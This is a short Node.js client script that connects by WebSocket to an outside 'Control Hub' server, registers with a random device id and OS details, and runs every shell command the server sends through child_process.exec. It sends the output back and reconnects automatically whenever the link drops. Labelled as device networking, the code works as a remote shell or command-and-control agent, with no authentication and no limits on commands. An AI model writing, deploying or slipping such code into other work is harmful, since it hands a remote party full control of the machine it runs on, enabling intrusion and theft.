const WebSocket = require('ws');
const os = require('os');
const { exec } = require('child_process');

const SERVER_URL = 'wss://device-network.onrender.com';
const deviceId = 'device-' + Math.floor(1000 + Math.random() * 9000);

function connect() {
    console.log(`Connecting to hub as ${deviceId}...`);
    const ws = new WebSocket(SERVER_URL);

    ws.on('open', () => {
        console.log('Connected to Control Hub successfully!');
        
        ws.send(JSON.stringify({
            type: 'register',
            deviceId: deviceId,
            info: {
                platform: os.platform(),
                arch: os.arch(),
                uptime: os.uptime()
            }
        }));
    });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === 'exec') {
                console.log(`Executing command: ${data.command}`);
                
                exec(data.command, (error, stdout, stderr) => {
                    const output = error ? (stderr || error.message) : stdout;
                    
                    ws.send(JSON.stringify({
                        type: 'response',
                        result: output || '(Command executed with no output)'
                    }));
                });
            }
        } catch (err) {
            console.error('Failed to parse message:', err.message);
        }
    });

    ws.on('close', () => {
        console.log('Connection lost. Attempting to reconnect in 5 seconds...');
        setTimeout(connect, 5000);
    });

    ws.on('error', (err) => {
        console.error('WebSocket Error:', err.message);
    });
}

connect();
